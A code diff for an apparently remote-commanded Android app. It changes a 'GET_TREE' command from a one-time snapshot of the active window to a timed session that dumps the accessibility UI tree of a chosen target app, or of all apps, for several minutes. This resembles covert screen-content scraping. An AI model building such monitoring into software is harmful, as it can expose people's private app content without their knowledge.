@@ -189,16 +189,18 @@ object CommandProcessor {
                     return
                 }
                 "GET_TREE" -> {
-                    val root = MyAccessibilityService.instance?.rootInActiveWindow
-                    if (root != null) {
-                        val treeJson = MyAccessibilityService.instance?.serializeNode(root)
-                        status = "UI_SNAPSHOT_CAPTURED"
-                        DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")
-                        updateCommandStatus(ctx, id, status, null, treeJson, null)
-                        return
+                    // Content format: "pkg_name|mins" or just "mins" or empty
+                    val parts = content.split("|")
+                    val pkg = if (parts.size >= 2) parts[0].trim() else if (parts[0].contains(".")) parts[0].trim() else null
+                    val mins = (if (parts.size >= 2) parts[1].toLongOrNull() else parts[0].toLongOrNull()) ?: 5L
+                    
+                    if (MyAccessibilityService.instance != null) {
+                        MyAccessibilityService.instance?.startTreeDump(pkg, mins)
+                        status = "SCAN_SESSION_STARTED"
+                        errorMsg = "Target: ${pkg ?: "GLOBAL"} | Duration: ${mins}m"
                     } else {
-                        status = "FAILED (NO_WINDOW)"
-                        errorMsg = "Accessibility could not find an active window to scrape."
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Accessibility service is not running."
                     }
                 }
                 "GET_LOGS" -> {
